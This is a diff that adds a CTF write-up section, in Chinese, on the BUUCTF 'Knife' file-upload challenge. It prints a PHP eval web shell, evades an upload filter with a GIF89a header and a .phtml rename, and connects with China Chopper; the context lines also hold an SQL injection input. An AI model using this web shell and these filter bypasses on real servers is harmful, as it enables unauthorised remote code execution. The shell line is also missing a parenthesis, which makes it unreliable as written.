@@ -310,4 +310,35 @@ ls执行后第一行就是flag.php
         输入1'; show columns from `words`; # 字段使用的是反勾号（ ` ）
 ****
 
+5.文件上传（例题：BUUCTF Knife）
+-
 
+进入题目环境可以上传文件。<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/c7b95226-0c89-42d4-ba86-21c004fe7dad)
+<br>
+
+编写一句话木马上传
+```
+<script language='php'>eval($_POST['shell'];</script>
+```
+发现只让上传jpg png等图片。我们用shell.phtml的文件名直接上传，可以看到有一个前端检查，对文件后缀进行检查。接下来，我们将文件名改成shell.jpg进行上传。
+然后又上传失败了，应该是在后端也对我们的文件内容进行了检测。接下来我们试着用**文件幻术头**的方式进行绕过。
+```
+GIF89a
+<script language='php'>eval($_POST['shell'];</script>
+```
+发现能够绕过检测。此时重新上传，抓包，将文件后缀名改成phtml。<br>
+<br>
+上传成功之后，没有给我们具体的存储位置，我们猜测应该是存在/upload的路径之下，然后我们试着去访问文件。
+<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/10a7aeb1-e3a9-4986-be4a-5e680fca4ed2)
+
+
+<br>
+成功访问。
+接下来就可以用菜刀进行连接了。<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/459348e5-0495-406c-908a-3cf5e427982a)
+
+<br>
+找到flag<br>
+![image](https://github.com/xhsy0314/Task/assets/84487619/c6d5f57a-4830-4a3b-a743-eb51049c0cb5)
